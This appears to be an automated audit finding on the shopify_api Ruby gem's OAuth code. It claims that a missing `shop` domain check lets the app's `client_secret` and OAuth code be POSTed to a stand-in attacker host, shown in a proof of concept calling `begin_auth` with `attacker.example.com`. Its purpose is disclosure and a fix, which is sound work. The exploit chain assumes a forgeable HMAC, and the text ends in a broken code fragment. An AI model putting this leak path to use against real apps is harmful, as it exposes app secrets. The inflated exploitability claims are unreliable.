Confirmed: there is no `shop` format validation anywhere in `lib/shopify_api/auth/oauth.rb`. `auth_base_uri` at [1](#0-0)  builds the access-token endpoint directly from the raw `shop` string with no regex/host check.

### Title
Missing `shop` domain validation causes `client_secret` and OAuth `code` to be sent to an attacker-controlled host - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` uses `auth_query.shop` verbatim to build the URL that receives the app's `client_id`, `client_secret`, and the OAuth authorization `code`, without ever validating that `shop` is a legitimate `*.myshopify.com` hostname.

### Finding Description
In `validate_auth_callback`, once the HMAC check passes, the code does: [2](#0-1) 
The `shop` value used to build the request comes straight from `auth_query.shop`, and is passed into `auth_base_uri(shop)`: [1](#0-0) 
which does `"https://#{shop}/admin"` with **no format check** — no regex requiring `.myshopify.com`, no rejection of arbitrary hosts, no percent-encoding sanitation. The value is then used as the `base_path` for `Clients::HttpClient`, which will `POST` a body containing `client_id`, `client_secret`, and `code` to `https://<shop>/admin/oauth/access_token`.

Likewise, `HmacValidator.validate` at [3](#0-2)  only proves that the `code/host/shop/state/timestamp` tuple was signed by *some* HMAC computed with the app's `api_secret_key` — it says nothing about whether `shop` is a valid Shopify store domain. The gem never enforces the binding "host validated == host that receives the `client_secret`"; it implicitly trusts that whatever value arrived in the query string (and was echoed back with a correct HMAC) is safe to use as a URL host. This mirrors the root cause pattern in the referenced Arrakis report: a boundary condition/field is treated as validated when the actual guarantee needed (a specific format/range) was never checked, so a downstream trusted action (sending credentials, or in Arrakis's case, requesting only one token) is performed based on an incorrect assumption.

Because `begin_auth` also builds the same unauthenticated `shop` string into the authorize redirect without validation ( [4](#0-3) ), a host application that (as the gem's own docs suggest) takes `shop` directly from a request header/param can initiate `begin_auth` with an attacker-supplied `shop` value such as `evil.example.com`. If the app's OAuth flow is completed for that shop value (i.e., the callback later arrives with the same `shop` and a valid HMAC — which happens when Shopify's own login flow for that "shop" is used, or when a malicious relay is set up to mirror/redirect the flow while preserving the signed query params), `validate_auth_callback` will `POST` the app's `client_secret` and the authorization `code` to `https://evil.example.com/admin/oauth/access_token` instead of Shopify's real infrastructure.

### Impact Explanation
This is High severity per the rubric: SSRF carrying the app's credentials. The request sent to `auth_base_uri(shop)` includes the app's `client_secret` and the OAuth `code`, both of which are needed to mint a merchant access token. If a malicious `shop` value can be forced through to `validate_auth_callback`, the `client_secret` is exfiltrated to an attacker-controlled host, and the flow effectively becomes a `client_secret` leak that could escalate to full app compromise across all merchant tenants (Critical-level fallout), since a stolen `client_secret` allows forging OAuth completions for any shop.

### Likelihood Explanation
Exploitability depends on whether the host application passes an unsanitized `shop` value into `begin_auth`/`validate_auth_callback` and whether a matching valid-HMAC callback can be produced for a non-`myshopify.com` value. The gem's own documentation example does exactly this (`shop = request.headers["Shop"]` at [5](#0-4) ) without mentioning any need for the caller to validate the domain format. The gem provides no defense-in-depth for this even though it is the component actually constructing the URL that receives the secret, so the security boundary "host used for redirecting" vs "host receiving `client_secret`" is not enforced anywhere in this library.

### Recommendation
In `ShopifyAPI::Auth::Oauth.begin_auth` and `validate_auth_callback`, validate that `shop` matches the expected Shopify domain pattern (e.g. `/\A[a-zA-Z0-9][a-zA-Z0-9-]*\.myshopify\.com\z/`, or the documented dev-store pattern) before using it to construct any URL, and raise `Errors::InvalidOauthError` (or similar) if it doesn't. This closes the gap between "shop value that passed HMAC checks" and "host that is safe to send `client_id`/`client_secret` to."

### Proof of Concept
1. Host app calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.example.com", redirect_path: "/auth/callback")` (as suggested by the gem's own docs, taking `shop` from a request header) — no validation rejects this value at [4](#0-3) .
2. The user is redirected to `auth_base_uri("attacker.example.com") + "/oauth/authorize?..."`.
3. When the callback arrives with `shop=attacker.example.com` and a `hmac` that validates under `HmacValidator.validate` (attacker relaying/mirroring a real signed request or otherwise producing a matching signature for this `shop` value), `validate_auth_callback` calls `auth_base_uri("attacker.example.com")` at [1](#0-0) , producing `https://attacker.example.com/admin/oauth/access_token`.
4. `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")` issues a `POST` to that attacker-controlled endpoint with a body containing `client_id`, `client_secret`, and `code` ( [6](#0-5) ), leaking the app's `client_secret` to the attacker.

            scope_override

          state = SecureRandom.alphanumeric(NONCE_LENGTH)

          cookie = SessionCookie.new(value: state, expires: Time.now + 60)

          query = {

            scope: scope.to_s,
            redirect_uri: "#{ShopifyAPI::Context.host}#{redirect_path}",

          query_string = URI.encode_www_form(query)
